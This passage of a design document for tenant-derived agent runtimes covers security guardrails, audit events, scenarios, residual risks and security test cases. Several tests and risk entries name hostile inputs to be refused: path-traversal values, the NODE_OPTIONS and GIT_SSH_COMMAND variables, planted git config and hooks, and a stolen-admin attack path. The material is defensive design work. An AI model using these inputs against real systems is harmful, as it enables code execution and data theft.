- It may only narrow `capabilities.interaction` and `capabilities.injection`, and a widening is refused, because these fields describe the binary (F-5.1.36). A narrowing that removes a capability another one depends on removes the dependent too, under the dependency rules of [RP-2](../0139-runtime-protocol/change.md#rp-2-capabilities-and-their-dependencies).
- The members it replaced today for pre-launched runtimes leave with them, because every runtime launches at bind (decision D21 of [`0140-runtime-revisions`](../0140-runtime-revisions/decisions.md#decisions)). F-5.1.35 and F-6.1.29 close with that removal.

### DR-7: Security oversight and records

**Guardrail.** The tenant security record ([SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)) gains one constraint:

```json
"derivedRuntimes": { "forbid": ["all"] }
```

The values are `all`, `setupCommands`, `workspaceFiles`, `gitClones`, `floatingCloneRefs`, `writableDefaultClones`, `alwaysWritableClones`, `reservation`, and `reusedPods`. As with the other constraints, the platform grants the class and the tenant's security team can still forbid it. Stopping tenant code takes `setupCommands`, `workspaceFiles`, and `gitClones`, because a file and a clone are code. `workspaceFiles` also refuses the runtime's `inline` and `artifact` assets, and `gitClones` its `gitRepository` assets, under "Tenant shared assets". `verbatimClientFiles: forbid`, the guardrail that stops tenant client config files and overlay file templates, also forbids `workspaceFiles` and `gitClones`, because each puts arbitrary content in the pod, and a `security-admin` who set it expects that channel closed.

- A violating write answers `422 GUARDRAIL_VIOLATION`.
- `reusedPods` requires `oneSessionPerPod: true` on every derived runtime of the tenant. A runtime holding `false` is non-compliant whatever its template states today, so a create or a `PUT` without the field answers `422 GUARDRAIL_VIOLATION`, and a tightening suspends it until a compliant `PUT`. A row holding `true` takes no widening from a template, so a template write never needs to read this value. The field is one-way, so removing the value leaves it set.
- A tightening sets `suspendedBy` on each non-compliant derived runtime, apart from one it names as an exemption under **Named exemptions.** in [SO-2, "Enforcement"](../0142-security-oversight/change.md#enforcement), which posture then lists. A compliant `PUT` clears the mark, as [SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)'s table states for a restored preset, a named, versioned set of request rules that a guardrail can require on a credential binding. A suspended runtime leaves discovery, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and its pool stops warming and drains. Running sessions continue, under the residual "A stored plan outlives a stop".
- Removing a forbid is a weakening, with [SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)'s delay. Creating a derived runtime is not a weakening by itself (decision 9).

**Posture.** A new `derivedRuntimes` section reports each runtime's name, base, `baseStatus`, count and digest of default commands and files, each default clone's URL and ref, whether the ref is a full commit, its `write` value, each `inline` and `artifact` asset's path and digest, each `gitRepository` asset's `name`, URL, ref, `prestage`, and declarer, each warm-list entry suspended at render with its reason, `reservedPods`, `oneSessionPerPod`, the effective `maxConcurrentSessionsPerPod` and recycling, `placement.offering`, last writer, and last change. `gates` reports the grant, its limits, and current use. `pools` already reports `ownerTenant`.

**Records.** `admin.runtime.updated` carries `changedFields` alone today. The new events, `admin.derived_runtime.created`, `.updated`, and `.deleted`, carry the owner, the base, the version, the full text of each setup command, each file's path and digest, each default clone's URL, ref, path, and `write`, each `inline` and `artifact` asset's path, size, and digest, each `gitRepository` asset's `name`, URL, ref, `prestage`, and declarer, and before and after values for `oneSessionPerPod`, `sessionPolicy`, and the pool's `warmCount` and `reservedPods`. Command text belongs in the record, because it is what ran in every session. File content stays out, because a tenant can place sensitive data there against the documentation, and the composed plan or the artifact store already holds it. An artifact upload emits `admin.derived_runtime.artifact_uploaded` with the digest and size, and the deletion of an upload emits `admin.derived_runtime.artifact_deleted` with the digest and the reason: `unreferenced`, `runtimeDeleted`, or `tenantDeleted`. `derivation-grant` writes and retirement emit their own events. A store withheld for a session writes `warm_store.withheld` with the session, the entry, and the reason, as "Withheld stores" under DR-9 states. A `platform-admin`'s write to a tenant-derived runtime uses the same route and is mirrored under [SO-4a](../0142-security-oversight/change.md#so-4a-mirror-to-the-tenant-chain).

## Scenarios

**An environment's way to one-session pods.** The platform has granted `acme` the base `chat` with template pool `chat-shared`, which serves concurrent sessions on a runtime class where `netagent` cannot attribute a connection to its slot, so its pods keep the union scope under the fallback of the egress design's decision 60. Environment `payments` denies `huggingface.co`, so Bob's create on `chat` in `payments` fails with `ENVIRONMENT_POLICY_NOT_ENFORCEABLE`, and the `Warning` from the policy write named `chat` as affected and as a base that offers this way. Alice, a `tenant-admin`, posts this:

```yaml
name: acme--chat-payments
baseRuntime: chat
labels: { environment: payments, approved: "false" }
oneSessionPerPod: true
pool: { warmCount: 2, resourceClass: small }
```

The response warns that `payments` admits the runtime. The controller creates two pods from `chat`'s `Runtime` resource, labelled for `acme`. Bob's create succeeds on a one-session pod with `payments`' full policy. The grant sets neither default flag, so no tenant code runs, and this way does not need DR-3.

**Another tenant.** An administrator of `globex` posts `name: acme--x` and gets `422 INVALID_DERIVED_RUNTIME`, and a post under `globex--x` with no grant gets `403 DERIVATION_NOT_GRANTED`. A `globex` user creating a session on `acme--chat-payments` gets the answer for an unknown runtime, and `GET /v1/runtimes` does not list it. A `globex` route naming `acme--chat-payments` as a target gets the answer for an unknown runtime, because route admission reads the tenant view.

**A concurrency value.** The template serves 20 concurrent sessions. Alice sends `sessionPolicy: { maxConcurrentSessionsPerPod: 5 }` and gets `422 INVALID_DERIVED_RUNTIME`, with `details.field: sessionPolicy.maxConcurrentSessionsPerPod`. She can set `oneSessionPerPod: true`, and another value takes a template from a `platform-admin`.

**A budget reached.** `acme` holds `maxOwnedPods: 20`, with warm counts summing to 8 and 11 active pods, so T is 19. Bob's claim takes T to 20, which the bound allows. Carol's claim would take it to 21, so it answers `429 QUOTA_EXCEEDED`, though warm pods sit idle. With those 12 active pods, a write taking the warm sum from 8 to 9 answers `422 DERIVATION_BUDGET_EXCEEDED`, with the current use. A write lowering the sum passes.

**A base retired.** An operator retires `chat` with 30 days' notice. `acme`'s audit chain and SIEM destination receive `runtime.base_changed`, and `GET` shows `baseStatus: retiring`. Sessions continue. After the date, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, the owned pool drains, and running sessions finish under their limits. Alice has moved `payments` to another base by then.

**A default clone.** The grant sets `allowGitClones`. Alice adds `github.com/acme/agent-skills` at `main`, under a VCS pool with `userAuthorization: required`, and the write warns that the ref floats and that repository access now decides who can use the runtime. Bob holds a link and read access, so his session binds the commit `main` names at that moment, and his plan records it. Carol has a link and no access, so her create answers `USER_REPOSITORY_ACCESS_DENIED` with `details.source: runtimeDefault` and `path: skills`, no repository name, and no pod claimed. Dave has no link and gets `LINKS_REQUIRED`, with the link under `details.userLinks`. A later push to `main` reaches new sessions with no write at Lenny, so `acme`'s `security-admin` sets `floatingCloneRefs` in `forbid`, and the runtime is suspended until Alice pins a commit.

**A warm, writable clone.** The grant sets `allowGitClones` and `maxWarmCloneBytes: 10Gi`. Alice adds a default clone of `github.com/acme/monorepo` at `main`, with `write: clientOptIn`, at `src`, and a `gitRepository` asset `monorepo` for the same URL with `prestage: true`. Each warm pod fills a store before it reports ready and stages a tree in each idle slot. Bob's client sends `writeDefaultClones: true` without knowing the repository's name, and his session binds the commit `main` names, adopts the staged tree by renaming it to `src`, and checks out the few commits that moved since the fill, fetching only what the store lacks. Bob holds read access and no write access, so his session runs read-only and the response lists `src` under `readOnlyDefaultClones`. Carol holds both and pushes her branch. A week later Alice removes the asset, the next claim refuses any pod still holding that store, the idle pods drain, and the default clone fetches its repository at materialization from then on.

**A repository the plan names.** Alice adds a `gitRepository` asset `monorepo-cache` for `github.com/acme/monorepo` at `main`, without `prestage`, to `acme--chat-payments`, which has no default clone of it, under a VCS pool with `userAuthorization: off` and no `environments` list. The base `chat` carries a public `gitRepository` entry for `https://gitlab.com/initech/toolkit`, so each warm pod of the owned pool fills both stores. Bob's client clones `acme/monorepo` at his branch `bob/fix`, and his session fetches only the commits the store lacks, because a store serves any source of its URL. Carol's session names environment `research`, which denies `github.com`, so her read check on the entry fails. Her pod serves one session, so the adapter deletes the store before it materializes anything, her session proceeds, and the response lists `withheldWarmEntries` with `name: monorepo-cache` and `reason: environment`. Her pod drains when her session ends. The initech entry later fails to fill after its host moves, so the owned pool backs off, Alice's `GET` reports `blockedBy: platformEntry` with its URL, the operator gets the alert, and the failed pods do not count in `acme`'s T.

**A reservation.** The operator sets `reservations.enabled` and `totalPods: { small: 100 }`, with `placement.reservedOverlay` on the template naming a node pool the operator labels and taints for reserved pods. A platform admin gives `acme` `maxOwnedPods: 20` and `maxReservedPods: { small: 10 }`. Alice sets `reservedPods: 10` and `warmCount: 2` on `acme--chat-payments`, which takes T to 12, so 10 warm pods start on the overlay's nodes. A burst on other pools fills `lenny-agent-quota` and its own nodes, and `acme`'s pods are unaffected. With all 10 in use, two more warm pods start under the general quota if it has room, and further claims can take the tenant to 20 pods. An administrator of `globex` with no allowance who sets `reservedPods` gets `422 DERIVATION_BUDGET_EXCEEDED`.

**A stolen `tenant-admin`.** A grant with no default flag refuses the attacker's default file, command, clone, and shared asset, because an `inline` or `artifact` asset needs `allowAssets` and a `gitRepository` asset needs `allowGitClones`, each with DR-3 landed. Under a grant with `allowWorkspaceFiles`, the attacker writes a `requirements.txt` that a base command installs, or a hook the runtime loads, and under `allowAssets` a file under `/lenny/assets` that the runtime loads, and that code runs at the slot UID in each new session. It can read a `file` token and use an `inject` token. The audit event carries the file's path and digest, and an [SO-3](../0142-security-oversight/change.md#so-3-per-tenant-siem-destination) SIEM destination receives it at once. `derivedRuntimes.forbid` with `workspaceFiles`, `setupCommands`, and `gitClones` refuses the write. Otherwise an operator sets the flag false, which makes the runtime `incompatible` for new sessions, or a `security-admin` adds the forbid. The composed plan on each session row records which sessions ran it.

## Residual risks

- **A tenant admin's reach.** A `tenant-admin` can write defaults that run in every session on a derived runtime, including in an environment it does not belong to, because [`0149-tenant-scoping-identity`](../0149-tenant-scoping-identity/change.md) already leaves it able to add itself as a member. Environments give no boundary against a tenant admin. No control bounds what a default file does once a base command or the runtime reads it, and commands within an allowlist can still do what the allowed tools do.
- **No per-session consent.** A user selecting a runtime receives its defaults. The plan on `GET /v1/sessions/{id}` shows them after the fact.
- **Shared capacity.** Budgets bound what a tenant holds, and only DR-10 sets a floor. Tenant-owned pods with no reservation share nodes and the namespace `ResourceQuota` with every other pool, and a quota reached by any pods stops pods of all pools, which is true of session load today. A `maxOwnedPodsTotal` set below the quota limits this for owned pools alone. The bound is a pod count, so a tenant using `large` holds more than one using `small`.
- **Pod-count overshoot.** The creation rule reads a cached list and the controller reconciles pools concurrently, so pods can pass `maxOwnedPods` by a small number until the next reconcile.
- **A busy reservation at its bound.** Pods that are draining count toward `maxOwnedPods` at creation, so a pool whose short sessions keep pods draining can fall below its floor when the tenant is at the bound. An operator gives headroom by setting `maxOwnedPods` above the reservation by what its drains need. `TenantReservationUnmet` reports the shortfall. Real drain durations were not measured.
- **Reads a user did not ask for.** Under a VCS pool with `userAuthorization: required`, a default clone reads a repository the session user can read, on the authority of that user's link, which a tenant admin chose and the user did not name. The user's choice of runtime is the only consent, and the plan shows it after the fact. A default command or base command can then send that content wherever the session's egress allows.
- **Pushers run code.** Whoever can push to a default clone's floating ref runs code in every new session on the runtime, as DR-9 states, until a forbid or a pinned commit applies.
- **Push access with no client statement.** Under `write: always`, every session on the runtime can push within the clone's ref namespace, including a session whose client does not know the repository exists and an agent under prompt injection. The grant flag, the forbid, and the namespace bound this, and branch protection on the host remains the tenant's control.
- **A warm store outlives a host-side revocation.** A repository whose host access ends stays readable on idle pods until the pool's `warmCloneMaxAgeSeconds`, at most 24 hours by default, for a session whose bind checks still pass, because a commit the store holds needs no fetch. On a VCS pool with `userAuthorization: required`, each user's own check still runs. A running session keeps its store when a clone is removed.
- **A new entry can change a resume.** A tenant admin adding a `gitRepository` asset withholds that store from a resumed session whose user cannot read the repository, because the session's next pod holds the store. On a pod with several slots the resume fails instead.
- **Deleted stores leave blocks on the node.** Withholding a store deletes its directory entries and leaves its data blocks on the node's disk until they are overwritten. A user without access could recover the repository only through a kernel or filesystem bug that exposes stale data, and only within the tenant, because the store sits on the tenant's owned pool or is a public operator entry. Every pod's ephemeral data already leaves stale blocks of the same class on its node, and a full kernel escape already exposes the node. The owner accepted this on 2026-11-08 (decision 34).
- **A `gitRepository` asset narrows some sessions.** A session whose user or environment fails the checks of an entry its plan does not name runs without the store, and its pod drains when the session ends, so such users cost the pool a pod each. The tenant admin's per-entry counts report how often this happens.
- **An operator's entry on a tenant's pods.** A base's public entry fills on every owned pool of the base, on the tenant's egress identity and within the template's `warmCloneBytes`. A failing operator entry leaves the owned pool with no warm pods until the operator fixes it or the backoff passes, and the tenant can only report it. Under decision 38 such pods still count toward the creation bound and the fill limit.
- **Disk pressure.** A warm pod within its storage request ranks after pods with no request for kubelet eviction. Every agent pod requests the sum of its disk-backed volumes' `sizeLimit`s ([PL-5](../0118-agent-pod-layout/change.md#pl-5-volumes-size-limits-and-eviction), PLR-12), so an agent pod within its volumes' limits does not go first. The ranking was read from upstream, and that a zero request counts as exceeded is from memory. `sizeLimit` counts bytes, so a tree within `adapter.maxCloneTreeEntries` can still use many inodes on a node, and that eviction signal is also from memory.
- **A resume under `reusedPods`.** A session that began before the forbid can resume on a suspended runtime's pod, joining or taking a pod another user of the tenant held, because `resumeOnPod` skips the tenant view. The session already ran under that policy, and it stays within the tenant. A `PUT` setting `oneSessionPerPod: true` ends this, and refusing the resume would strand the session instead.
- **Writable clones on reused pods.** A tenant whose derived runtime reuses pods cannot give a default clone a `write` value until it sets `oneSessionPerPod: true`, and a client declares a repository to push to it. A pool that has held such a clone cannot widen later, so a tenant creates a new runtime for that.
- **A removed repository on reused pods.** As "Who reaches a store" states, a store stays readable to new sessions on a running or held pod until the pod retires.
- **A default clone can lock users out.** A repository removed from the allowlist or a revoked permission refuses new sessions on the runtime for the users affected.
- **Reserved capacity with shared nodes.** Without `placement.reservedOverlay`, a replacement for a reserved pod competes for free node capacity, so a full cluster delays it, and the alert reports it.
- **A listed overlay row.** A stolen `tenant-admin` with `caBundle` listed can read what tools send to hosts `netagent` does not terminate, on pods created afterwards, including a `file` token that opens systems outside the tenant. Other tenants' pods and platform services do not trust that CA. [`0127-egress-and-git`](../0127-egress-and-git/change.md) states the limit of the LLM host reservation on a pool with `egressProfile: internet`: no LLM credential lease exists under [`0133-llm-upstreams-and-cost-budgets`](../0133-llm-upstreams-and-cost-budgets/change.md), so the exposure is the session's proxy token, which a process in the pod can send to any host on such a pool and whose use the session's credit budgets bound. A listed `egressProfile` row set to `internet` lets raw traffic leave from a shared address with no decision.
- **Warm pods after an overlay row drops.** No pod roll is triggered, so warm pods carrying a dropped `caBundle` or `clientProfile` serve new sessions until they are used up.
- **Deleting a base's `Runtime` resource.** The RuntimeReconciler's finalizer soft-deletes the row and bypasses notice and the dependents check. An operator who deletes the resource directly strands tenant-derived runtimes at once, as `retired`.
- **A stored plan outlives a stop.** A grant flag set false, a forbid, or a suspension stops new sessions. §7.3 step 3e rebuilds a session with no checkpoint from its stored plan and runs the plan's setup commands, so an attacker's default runs again in that session. An emergency retirement with `force: true` ends such sessions. Filtering on rebuild would need a per-command source on the stored plan, and that is additive. A writable entry a default clone added also stays in the stored plan until the session ends.
- **Trust in the base.** A tenant takes base changes with no approval step, apart from narrowing. A base's `workspaceDefaults` change reaches the tenant's new sessions at once, and a template widening reaches its owned pools in the same transaction. Posture and `runtime.base_changed` report it after the fact.
- **The retirement window.** A base can stay usable for its notice period. A compromised image needs the emergency path, which interrupts tenants.
- **Environment membership through labels.** A runtime enters a selector by inherited labels at create, and a label edit or a base label change alters membership at once. The `Warning` reports it to the writer. A platform's base label edit reaches tenants with only the base-changed event.
- **A compromised gateway replica.** Row-level security limits a tenant-context query. A compromised replica can set any context, write any row, and write any pool. The owner label and the tenant pin check still refuse another tenant at the pod.
- **Defaults hold no secrets.** A tenant admin can write a secret into a default file against the documentation, and every reader of a session's plan then sees it. A secret in a tenant asset is readable to every session on the runtime in the same way.
- **Tenant assets are code.** A runtime can load a file under `/lenny/assets` that the base does not ship, so a tenant `inline` or `artifact` asset can change what the runtime does in every session on it, as a default file can. The append rule keeps a tenant from replacing an operator's file and does not stop this. The operator's Helm `allowAssets` and the grant entry's `allowAssets`, both off by default, and the `workspaceFiles` forbid bound it.
- **Prompt injection inside a tenant.** An agent discovering a derived runtime reads its `agentInterface` text, which a tenant admin wrote.
- **Unproven.** No part of the design has run. The warm clone spike of 2026-11-05 ran against a stand-in for `netagent`, and DR-9's "Not verified" lists what it left unverified. The pod path through `podRuntimeRef`, the `lenny.dev/served` readers, and the merge as an intersection have not run.

### Tier 9: security

- DF-1: a `tenant-admin` holding a grant, and a custom role naming either permission, gets `403` on each field of the runtime and pool `PUT`, and on `drain`. A custom role write naming either permission is refused.
- A `tenant-admin`'s route naming another tenant's runtime or owned pool as a target gets the unknown answer, and a route moving a session onto an owned pool of another tenant is refused at the post-chain point.
- DF-2: a tenant with no grant cannot create on, discover, or delegate to a platform runtime.
- Each surface answers identically for another tenant's name and for an absent one: admin reads, `GET /v1/runtimes`, metadata, `/v1/models`, session create, delegate, route write, and `pool` pin.
- DF-4, on a one-session pod: a setup command's process runs at the slot UID, and cannot read the service account token or write the credential volume.
- A default command outside the base's allowlist, or under a policy with `shell: true`, is refused at write and at bind. A tenant file on a path a base file holds is refused.
- `allowSetupCommands` or `allowWorkspaceFiles` set false makes a runtime holding that default refuse new sessions.
- A tenant-set variable outside the chart's allowlist, such as `NODE_OPTIONS` or `GIT_SSH_COMMAND`, is refused on an owned pool, whatever the copied flag says.
- A create, a derive, and a delegated child, with and without exports, whose final runtime row is not `registered` are refused with the unknown-runtime answer, including when a runtime route or a `PreRoute` interceptor moves the session there after the export step, and the child's exports are undone. A platform-derived runtime whose base row is not `registered` is refused the same way. The same requests onto a `registered` runtime pass, and a resume onto an unregistered runtime's row is not refused. A runtime write naming `type` or `executionMode` answers `400 VALIDATION_ERROR` naming the field.
- A `--` name from another tenant creates no admission rate-limit entry for its pool, and `verbatimClientFiles: forbid` refuses a default file.
- Revoking access after a route's write refuses the sessions and delegated children it moves, at the post-chain point, for a runtime with no `--`.
- A flag-lowering write emits `runtime.base_changed` to a tenant with an overlay and no grant. A tenant `PUT` does not clear `warm_stop_reasons`.
- A pod of an owned pool cannot be claimed for another tenant, even when the gateway's first layer is skipped.
- A restored symbolic link chain, and a single link an agent wrote in the live tree, fail materialization for an `inlineFile`, `uploadFile`, clone, and move, and nothing is written outside the slot.
- A user with no read access on a VCS pool with `userAuthorization: required` is refused on a default clone, the answer omits the repository name, no `ls-refs` runs, and no App token is minted. A `.git/config`, `commondir`, or hook already in a clone's target, including from a restored snapshot, runs nothing in the helper's git and does not survive the move, and the adapter runs no git on the slot repository. A default-clone refusal on a VCS pool with `userAuthorization: off` for a repository made private carries no URL. A `floatingCloneRefs` forbid suspends a runtime with a branch ref. `verbatimClientFiles: forbid` refuses a default clone. A route target brings its clones under the same checks.
- A hostile repository in a warm fill is parsed only in `lenny-store-fill`, which holds no service account token and no credential, and the adapter's container runs no git. The hostile-repository stress suite of the egress design's decision 61 runs on runc, gVisor, and Kata: setuid and setgid files, symbolic-link and hard-link farms, deep and wide trees, mode-`000` directories, name collisions, very large files, and the deletion of a withheld store while a slot reads it leave no slot with write access to a store, the store group, or a set-ID bit. An unbound owned pod reads its warm list and nothing else, and gets no write token. An agent cannot write a store from its slot container. A commit the store holds is refused at bind for a user who lacks access, with no pod claimed. `write: always` with a pattern outside the namespace is refused at write, as is `always` under `prAuthoring: user`, and a push to the default branch is refused by `netagent`. A planted `lenny.gitStoreUrl` causes no fetch of that URL. `writableDefaultClones` and `alwaysWritableClones` suspend the runtimes they match. A kept tree's planted `.git/config`, hook, and alternates run nothing in the helper's `capture-copy` or `restore-complete`, and nothing at the adapter's UID.
- A withheld store is gone before any setup command, restore completion, or runtime start: a setup command listing `/lenny/git-stores` finds no directory for it, the slot container cannot open it, a tree staged from it under `/workspace/.lenny-prestage/` is gone, and a restored repository whose `lenny.gitStoreUrl` names its URL gets no alternates and no fetch. No runtime process exists in the slot before assignment, so none holds a descriptor under `/lenny/git-stores`.
- An agent-written `lenny.gitStoreUrl` outside the URLs the gateway passed for the bind causes no fetch, and a repository wired to a store through alternates with no `lenny.*` keys cannot read a withheld store.
- A tenant with no allowance cannot set `reservedPods`, and no tenant write changes a Helm total or `placement.reservedOverlay`.
- A tenant asset never reaches another tenant: no pod of a shared pool or of another tenant's owned pool mounts it, another tenant's session cannot reference its chunk set, an upload is stored under the owning tenant's key, tenant deletion erases the uploads and the set, and a legal hold keeps them. A tenant `inline` path such as `../x`, `.lenny-prestage`, or `.git/hooks/x` is refused, and nothing a tenant asset writes lands outside `/lenny/assets`.
- A forbid in the tenant security record ([SO-2](../0142-security-oversight/change.md#so-2-tenant-security-record-and-posture)) refuses a write, suspends existing runtimes, and a removal waits out the delay.
